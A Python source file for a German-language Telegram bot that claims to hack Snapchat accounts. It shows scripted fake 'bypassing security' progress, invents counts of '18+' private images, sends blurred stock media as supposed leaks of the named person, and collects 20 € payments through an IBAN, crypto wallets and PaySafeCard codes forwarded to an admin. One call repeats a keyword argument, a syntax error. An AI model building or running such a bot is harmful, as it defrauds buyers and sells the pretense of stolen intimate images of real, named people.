import os
import subprocess
from threading import Thread
from pathlib import Path
from random import sample, randint
from flask import Flask
import asyncio
import re
import requests
from bs4 import BeautifulSoup
from PIL import Image, ImageFilter
import urllib.request
import zipfile
import json
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from telegram.constants import ParseMode

# 📂 Datei für gespeicherte User
USERS_FILE = "users.txt"

# ✅ Umgebungsvariablen laden
TOKEN = os.getenv("TOKEN")
CHANNEL_ID = os.getenv("CHANNEL_ID")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID")

if not TOKEN:
    raise ValueError("❌ Umgebungsvariable 'TOKEN' fehlt!")
if not CHANNEL_ID or not ADMIN_CHAT_ID:
    raise ValueError("❌ 'CHANNEL_ID' oder 'ADMIN_CHAT_ID' fehlt!")

CHANNEL_ID = int(CHANNEL_ID)
ADMIN_CHAT_ID = int(ADMIN_CHAT_ID)

# 🗂️ Ordner für Videos und Bilder einrichten
BASE = Path(__file__).parent
IMAGE_DIR = BASE / "images"   # JPG/PNG hinein
VIDEO_DIR = BASE / "videos"   # MP4 hinein
TEMP_DIR  = BASE / "temp"     # Output

for p in (IMAGE_DIR, VIDEO_DIR, TEMP_DIR):
    p.mkdir(exist_ok=True, parents=True)

# 📥 GitHub Media Downloader (Render-optimiert)
def download_github_media():
    """Downloads images and videos from GitHub repository"""
    github_api_base = "https://api.github.com/repos/Ayman5552/snap/contents"

    # Check if we already have media (avoid re-download)
    imgs = [f for f in IMAGE_DIR.glob("*.*") if f.suffix.lower() in ('.jpg', '.jpeg', '.png', '.gif', '.webp') and f.name != '.gitkeep']
    vids = [f for f in VIDEO_DIR.glob("*.*") if f.suffix.lower() in ('.mp4', '.mov', '.avi') and f.name != '.gitkeep']

    if len(imgs) >= 5 and len(vids) >= 5:
        print(f"✅ Media bereits vorhanden: {len(imgs)} Bilder, {len(vids)} Videos")
        return True

    print("📥 Lade Media von GitHub...")

    # Download images
    try:
        img_response = requests.get(f"{github_api_base}/Images", timeout=30)
        if img_response.status_code == 200:
            images = img_response.json()
            print(f"📥 Lade {len(images)} Bilder von GitHub...")

            for img in images[:10]:  # Limit to prevent timeouts
                if img['name'].lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp')):
                    img_path = IMAGE_DIR / img['name']
                    if not img_path.exists():
                        try:
                            urllib.request.urlretrieve(img['download_url'], img_path)
                            print(f"✅ {img['name']} heruntergeladen")
                        except Exception as e:
                            print(f"❌ Fehler beim Download {img['name']}: {e}")
    except Exception as e:
        print(f"⚠️ Fehler beim Laden der Bilder: {e}")

    # Download videos  
    try:
        vid_response = requests.get(f"{github_api_base}/videos", timeout=30)
        if vid_response.status_code == 200:
            videos = vid_response.json()
            print(f"📥 Lade {len(videos)} Videos von GitHub...")

            for vid in videos[:5]:  # Limit to prevent timeouts
                if vid['name'].lower().endswith(('.mp4', '.mov', '.avi')):
                    vid_path = VIDEO_DIR / vid['name']
                    if not vid_path.exists():
                        try:
                            urllib.request.urlretrieve(vid['download_url'], vid_path)
                            print(f"✅ {vid['name']} heruntergeladen")
                        except Exception as e:
                            print(f"❌ Fehler beim Download {vid['name']}: {e}")
    except Exception as e:
        print(f"⚠️ Fehler beim Laden der Videos: {e}")

    print(f"🎯 Media-Download abgeschlossen!")
    return True

# 🎛️ Blur-Einstellungen
BLUR_IMAGE_RADIUS = 28
VIDEO_BLUR_SIGMA = 36

# ---- Webserver (Render Alive) ----
app = Flask('')

@app.route('/')
def home():
    return "I'm alive"

def keep_alive():
    port = int(os.environ.get("PORT", 5000))
    Thread(target=lambda: app.run(host='0.0.0.0', port=port)).start()

# ---- Speicher für einmalige Beweise ----
user_proof_sent = set()
user_content_counts = {}  # Store generated counts per user

# ---- Video/Bild Verarbeitung ----
def censor_image(input_path: Path, output_path: Path):
    """Zensiert ein Bild mit Gaussian Blur"""
    try:
        im = Image.open(input_path).convert("RGB")
        im = im.filter(ImageFilter.GaussianBlur(BLUR_IMAGE_RADIUS))
        im.save(output_path, format="JPEG", quality=90)
        return True
    except Exception as e:
        print(f"❌ Fehler beim Zensieren von {input_path}: {e}")
        return False

def check_ffmpeg():
    """Check if ffmpeg is available"""
    try:
        subprocess.run(['ffmpeg', '-version'], capture_output=True, check=True)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False

def censor_video(input_path: Path, output_path: Path):
    """Zensiert ein Video mit ffmpeg Gaussian Blur"""
    if not check_ffmpeg():
        print("❌ ffmpeg nicht verfügbar")
        return False

    vf = f"gblur=sigma={VIDEO_BLUR_SIGMA}"
    cmd = [
        "ffmpeg", "-y",
        "-i", str(input_path),
        "-vf", vf,
        "-c:v", "libx264", "-preset", "veryfast", "-crf", "28",
        "-an",
        str(output_path),
    ]
    print("➡️ ffmpeg:", " ".join(cmd))
    try:
        subprocess.run(cmd, check=True, capture_output=True, text=True)
        print("✅ ffmpeg OK:", output_path)
        return True
    except subprocess.CalledProcessError as e:
        print("❌ ffmpeg Fehler:", e.stderr)
        return False

async def send_content_to_user(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, n_img: int, n_vid: int):
    """Sendet zensierte Bilder und Videos an den Benutzer"""
    # Ensure GitHub media is downloaded
    if not download_github_media():
        await context.bot.send_message(user_id, text="⚠️ Fehler beim Laden der GitHub Medien")
        return

    # Filter out .gitkeep and other non-media files
    imgs = [f for f in IMAGE_DIR.glob("*.*") if f.suffix.lower() in ('.jpg', '.jpeg', '.png', '.gif', '.webp') and f.name != '.gitkeep']
    vids = [f for f in VIDEO_DIR.glob("*.*") if f.suffix.lower() in ('.mp4', '.mov', '.avi') and f.name != '.gitkeep']

    print(f"📊 Verfügbare GitHub Medien: {len(imgs)} Bilder, {len(vids)} Videos")

    # If no GitHub content available, inform user
    if not imgs and not vids:
        await context.bot.send_message(user_id, text="⚠️ Keine GitHub Medien verfügbar")
        return

    # Zufällige Auswahl aus verfügbaren GitHub Medien
    pick_imgs = sample(imgs, min(n_img, len(imgs))) if imgs else []
    pick_vids = sample(vids, min(n_vid, len(vids))) if vids else []
    
    username = "Unknown"  # Fallback if username not available
    
    # Spannende zufällige Vorschau-Nachrichten
    preview_messages = [
        f"🔥 EXCLUSIVE LEAK! {len(pick_imgs)} geheime Bilder + {len(pick_vids)} heiße Videos von {username} gefunden!",
        f"💯 JACKPOT! {len(pick_imgs)} private Pics + {len(pick_vids)} intime Videos direkt aus dem Handy!",
        f"⚡ BOMBE! {len(pick_imgs)} Selfies + {len(pick_vids)} Stories die niemand sehen sollte!",
        f"🎯 TREFFER! {len(pick_imgs)} versteckte Fotos + {len(pick_vids)} geheime Clips entschlüsselt!",
        f"🔞 WARNING! {len(pick_imgs)} heiße Bilder + {len(pick_vids)} intime Videos - zu krass für Snapchat!",
        f"💎 PREMIUM CONTENT! {len(pick_imgs)} exclusive Pics + {len(pick_vids)} private Videos nur für dich!",
        f"🚨 LEAK ALERT! {len(pick_imgs)} gestohlene Selfies + {len(pick_vids)} geheime Aufnahmen!"
    ]
    # Limit to maximum 3 images and 3 videos, ensure different selection each time
    max_imgs = min(3, len(imgs))
    max_vids = min(3, len(vids))
    
    pick_imgs = sample(imgs, max_imgs) if imgs else []
    pick_vids = sample(vids, max_vids) if vids else []

    preview_msg = sample(preview_messages, 1)[0]
    # Simple preview message
    await context.bot.send_message(
        chat_id=user_id,
        text=preview_msg,
        text="Vorschau von dem Privat Bereich, für Alle Videos, Bilder bitte /pay ."
    )

    success_count = 0

    # Bilder senden
    for i, p in enumerate(pick_imgs):
        try:
            out = TEMP_DIR / f"c_{p.stem}_{i}.jpg"
            if censor_image(p, out) and out.exists():
                with open(out, "rb") as f:
                    await context.bot.send_photo(user_id, photo=f)
                    success_count += 1
                # Clean up temp file
                try:
                    out.unlink()
                except:
                    pass
            else:
                print(f"⚠️ Konnte Bild nicht verarbeiten: {p.name}")
        except Exception as e:
            print(f"❌ Fehler beim Senden von Bild {p.name}: {e}")
            await context.bot.send_message(user_id, text=f"⚠️ Ein Bild konnte nicht geladen werden")

    # Videos senden (nur wenn ffmpeg verfügbar)
    if check_ffmpeg():
        for i, p in enumerate(pick_vids):
            try:
                out = TEMP_DIR / f"c_{p.stem}_{i}.mp4"
                if censor_video(p, out) and out.exists():
                    with open(out, "rb") as f:
                        await context.bot.send_video(user_id, video=f)
                        success_count += 1
                    # Clean up temp file
                    try:
                        out.unlink()
                    except:
                        pass
                else:
                    print(f"⚠️ Konnte Video nicht verarbeiten: {p.name}")
            except Exception as e:
                print(f"❌ Fehler beim Senden von Video {p.name}: {e}")
                await context.bot.send_message(user_id, text=f"⚠️ Ein Video konnte nicht geladen werden")
    else:
        await context.bot.send_message(user_id, text="⚠️ Video-Verarbeitung momentan nicht verfügbar")

    print(f"✅ {success_count} GitHub Medien erfolgreich gesendet")

    # 💰 Payment Prompt nach Content-Delivery
    payment_messages = [
        "🔓 ZAHLE JETZT, um den vollständigen Zugang freizuschalten! Alle Videos & Bilder unzensiert! 💳",
        "💎 PREMIUM ACCESS: Zahle jetzt und bekomme ALLE Inhalte ohne Zensur! 🔥💰",
        "⚡ JETZT BEZAHLEN = SOFORTIGER VOLLZUGANG! Keine Wartezeit, alle Medien freigeschaltet! 💸",
        "🚀 UPGRADE JETZT! Bezahle und erhalte hunderte weitere private Aufnahmen! 💵",
        "🔥 ZAHLE SOFORT für den VIP-Zugang! Alle geheimen Videos + Bonus Content! 💳✨",
        "💰 JETZT FREISCHALTEN! Bezahle und sehe ALLES unzensiert - wird dich umhauen! 🔓"
    ]

    payment_msg = sample(payment_messages, 1)[0]
    await context.bot.send_message(
        chat_id=user_id,
        text=payment_msg,
        parse_mode='HTML'
    )

# ---- Snapchat Check ----
def check_snapchat_username_exists_and_get_name(username: str):
    url = f"https://www.snapchat.com/@{username}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
    }
    try:
        resp = requests.get(url, headers=headers, timeout=10)
        if resp.status_code == 200:
            if "Sorry, this account doesn't exist." in resp.text or "Not Found" in resp.text:
                return False, None
            soup = BeautifulSoup(resp.text, "html.parser")
            title = soup.find("title")
            if title:
                text = title.text.strip()
                name = text.split("(")[0].strip()
                return True, name
            else:
                return True, username
        else:
            return False, None
    except Exception as e:
        print("Fehler beim Abruf von Snapchat:", e)
        return False, None

# ---- START ----
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = user.id
    uname = user.username or ""

    with open(USERS_FILE, "a", encoding="utf-8") as f:
        f.write(f"{uid} {uname}\n")

    text = (
        "🌟 Bitte Join zuerst den Kanal, um den Bot zu Nutzen ! 🌟\n\n"
        "👉 https://t.me/+eR1UqN8_OUhlNzcx\n\n"
        "📢 Nach dem Beitritt kannst du sofort starten:\n"
        "/hack Benutzername\n\n"
        "Schicke Beweise für Zahlungen (Bank & Crypto als Foto, Paysafe als Code) direkt hier im Chat."
    )
    await update.message.reply_text(text)

# ---- ADMIN: /listusers ----
async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return

    if not os.path.exists(USERS_FILE):
        await update.message.reply_text("Noch keine Nutzer gespeichert.")
        return

    with open(USERS_FILE, "r", encoding="utf-8") as f:
        data = f.read().strip()

    if not data:
        await update.message.reply_text("Noch keine Nutzer gespeichert.")
    else:
        await update.message.reply_text(f"📋 Gespeicherte Nutzer:\n\n{data}")

# ---- HACK ----
async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    try:
        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ["left", "kicked"]:
            await update.message.reply_text(
                "🌟 Bitte abonniere zuerst den Kanal, um den Bot nutzen zu können! 🌟\n\n"
                "👉 https://t.me/+eR1UqN8_OUhlNzcx"
            )
            return
    except Exception as e:
        print("Fehler bei get_chat_member:", e)
        await update.message.reply_text("Fehler bei der Kanal-Überprüfung. Bitte versuche es später erneut.")
        return

    if not context.args:
        await update.message.reply_text("Bitte gib den Snapchat-Benutzernamen ein, z.B. /hack Lina.123")
        return

    username = context.args[0]
    exists, name = check_snapchat_username_exists_and_get_name(username)

    if not exists:
        await update.message.reply_text(
            f"Der Snapchat-Benutzername *{username}* wurde nicht gefunden.",
            parse_mode=ParseMode.MARKDOWN
        )
        return

    msg = await update.message.reply_text("🚀 Starte den Vorgang...")
    await asyncio.sleep(2)
    await msg.edit_text("🔍 Suche nach Nutzerdaten...")
    await asyncio.sleep(3)
    await msg.edit_text("⚙️ Umgehe Sicherheitsprotokolle...")
    await asyncio.sleep(2)
    await msg.edit_text("📡 Greife auf private Dateien zu...")
    await asyncio.sleep(2)

    # Zufällige Zahlen generieren
    bilder = randint(8, 12)
    videos = randint(7, 8)

    # Zahlen für späteren Abruf speichern
    user_content_counts[user_id] = {"bilder": bilder, "videos": videos}

    msg_text = (
        f"👾 Wir haben den Benutzer ({username}) gefunden, und das Konto ist angreifbar! 👾\n\n"
        f"👤 {name}\n"
        f"🖼️ {bilder} Bilder als 18+ getaggt\n"
        f"📹 {videos} Videos als 18+ getaggt\n\n"
        f"💶 Um sofort Zugriff auf das Konto und den Mega Ordner zu erhalten, tätige bitte eine Zahlung von 20 € mit /pay.\n\n"
        f"👉 Nach der Zahlung erhältst du hier Alles: https://mega.nz/folder/JU5zGDxQ#-Hxqn4xBLRIbM8vBFFFvZQ\n"
        f"👉 Nach der Zahlung erhältst du hier Alles: Mega.nz\n"
        f"🎁 Oder verdiene dir einen kostenlosen Hack, indem du andere mit /invite einlädst.\n\n"
    )
    await msg.edit_text(msg_text)

    # Sofort nach der Nachricht die entsprechende Anzahl Videos und Bilder von GitHub senden
    await send_content_to_user(update, context, user_id, bilder, videos)

# ---- PAY ----
async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🏦 Banküberweisung", callback_data="pay_bank")],
        [InlineKeyboardButton("💳 PaySafeCard", callback_data="pay_paysafe")],
        [InlineKeyboardButton("🪙 Kryptowährungen", callback_data="pay_crypto")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Wähle eine Zahlungsmethode aus:", reply_markup=reply_markup)

# ---- BUTTONS ----
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    cmd = query.data

    info_refund = (
        "\n\n⚠️ <b>Wichtig:</b> Bei deiner <u>ersten Zahlung</u> hast du eine "
        "<b>5 Minuten Testphase</b>. Wenn du in dieser Zeit stornierst, bekommst du <b>15 €</b> zurück.\n\n"
        "📌 <b>Verwendungszweck:</b> Gib <u>deinen Telegram-Namen</u> an!"
    )

    if cmd == "pay_bank":
        text = (
            "🏦 <b>Banküberweisung</b>\n\n"
            "Empfänger: Euro Hunter\n"
            "IBAN: <code>IE19 PPSE 9903 8052 2636 15</code>\n"
            f"{info_refund}"
            "\n\nBitte sende hier ein Foto deines Zahlungsbelegs."
        )
    elif cmd == "pay_paysafe":
        text = (
            "💳 <b>PaySafeCard</b>\n\n"
            "Bitte sende nur den 16-stelligen Code ins Chat:\n"
            "<code>0000-0000-0000-0000</code>\n"
            f"{info_refund}"
            "\n\nDer Code wird überprüft und weitergeleitet."
        )
    elif cmd == "pay_crypto":
        text = (
            "🪙 <b>Kryptowährungen</b>\n\n"
            "- BTC: <code>bc1q72jdez5v3m7dvtlpq8lyw6u8zpql6al6flwwyr</code>\n"
            "- ETH: <code>0xb213CaF608B8760F0fF3ea45923271c35EeA68F5</code>\n"
            "- LTC: <code>ltc1q8wxmmw7mclyk55fcyet98ul60f4e9n7d9mejp3</code>\n"
            f"{info_refund}"
            "\n\nBitte sende hier ein Foto deines Zahlungsbelegs."
        )
    elif cmd == "pay":
        keyboard = [
            [InlineKeyboardButton("🏦 Banküberweisung", callback_data="pay_bank")],
            [InlineKeyboardButton("💳 PaySafeCard", callback_data="pay_paysafe")],
            [InlineKeyboardButton("🪙 Kryptowährungen", callback_data="pay_crypto")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("Wähle eine Zahlungsmethode aus:", reply_markup=reply_markup)
        return
    else:
        await query.edit_message_text("Ungültige Auswahl.")
        return

    keyboard = [[InlineKeyboardButton("⬅️ Zurück", callback_data="pay")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)

# ---- PHOTO (Beweis) ----
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    from_user = update.message.from_user
    user_id = from_user.id

    if user_id in user_proof_sent:
        await update.message.reply_text("❌ Du kannst nur einmal einen Zahlungsbeweis senden.")
        return

    user_proof_sent.add(user_id)
    photo = update.message.photo[-1]
    caption = update.message.caption or ""

    forward_text = (
        f"📸 Neuer Beweis von @{from_user.username or from_user.first_name} (ID: {user_id})\n\n"
        f"Bildunterschrift:\n{caption}"
    )

    try:
        await context.bot.send_photo(
            chat_id=ADMIN_CHAT_ID,
            photo=photo.file_id,
            caption=forward_text,
            parse_mode=ParseMode.HTML,
        )
        await update.message.reply_text("✅ Dein Beweis wurde erfolgreich gesendet!")

        # Nach erfolgreichem Beweis automatisch GitHub Content senden
        if user_id in user_content_counts:
            counts = user_content_counts[user_id]
            await send_content_to_user(update, context, user_id, counts["bilder"], counts["videos"])
            del user_content_counts[user_id]  # Cleanup nach dem Senden

    except Exception as e:
        print("Fehler beim Senden des Beweisfotos:", e)
        await update.message.reply_text("❌ Fehler beim Senden des Beweisfotos.")

# ---- TEXT (Paysafe-Code) ----
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    paysafe_pattern = re.compile(r"^\d{4}-\d{4}-\d{4}-\d{4}$")
    from_user = update.message.from_user
    user_id = from_user.id

    if paysafe_pattern.match(text):
        if user_id in user_proof_sent:
            await update.message.reply_text("❌ Du kannst nur einmal einen Zahlungsbeweis senden.")
            return

        user_proof_sent.add(user_id)
        msg = f"🎫 Neuer Paysafe-Code von @{from_user.username or from_user.first_name}:\n<code>{text}</code>"
        await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=msg, parse_mode=ParseMode.HTML)
        await update.message.reply_text("✅ Dein Paysafe-Code wurde erfolgreich gesendet!")

        # Nach erfolgreichem Beweis automatisch GitHub Content senden
        if user_id in user_content_counts:
            counts = user_content_counts[user_id]
            await send_content_to_user(update, context, user_id, counts["bilder"], counts["videos"])
            del user_content_counts[user_id]  # Cleanup nach dem Senden

# ---- ADMIN: /sendcontent - Manuelles Senden für Tests ----
async def send_content(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return

    try:
        args = context.args or []
        n_img = int(args[0]) if len(args) > 0 else 1
        n_vid = int(args[1]) if len(args) > 1 else 1
        user_id = update.effective_user.id

        await send_content_to_user(update, context, user_id, n_img, n_vid)

    except Exception as e:
        await update.message.reply_text(f"❌ Fehler: {e}\nNutzung: /sendcontent <bilder> <videos>")

# ---- DUMMY INVITE/REDEEM/FAQ ----
async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = "🎁 Lade Freunde ein und erhalte einen kostenlosen Hack!\n\n🔗 https://t.me/+eR1UqN8_OUhlNzcx"
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Das Einlösen von Credits ist aktuell nicht verfügbar.")

async def faq(update: Update, context: ContextTypes.DEFAULT_TYPE):
    faq_text = (
        "📖 *Häufig gestellte Fragen (FAQ)*\n\n"
        "❓ Wie funktioniert das Ganze?\n"
        "💬 Gib den Befehl /hack Benutzername ein.\n\n"
        "❓ Wie lange dauert ein Hack?\n"
        "💬 In der Regel 3–5 Minuten.\n\n"
        "❓ Wie bezahle ich?\n"
        "💬 Mit /pay nach dem Hack."
    )
    await update.message.reply_text(faq_text, parse_mode=ParseMode.MARKDOWN)

# ---- MAIN ----
def main():
    print("🚀 Bot startet...")
    keep_alive()
    app_builder = ApplicationBuilder().token(TOKEN)
    application = app_builder.build()

    # Handler registrieren
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("hack", hack))
    application.add_handler(CommandHandler("pay", pay))
    application.add_handler(CommandHandler("invite", invite))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("faq", faq))
    application.add_handler(CommandHandler("listusers", list_users))
    application.add_handler(CommandHandler("sendcontent", send_content))

    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    print("🤖 Bot läuft! Drücke Ctrl+C zum Beenden.")
    application.run_polling()

if __name__ == "__main__":
    main()
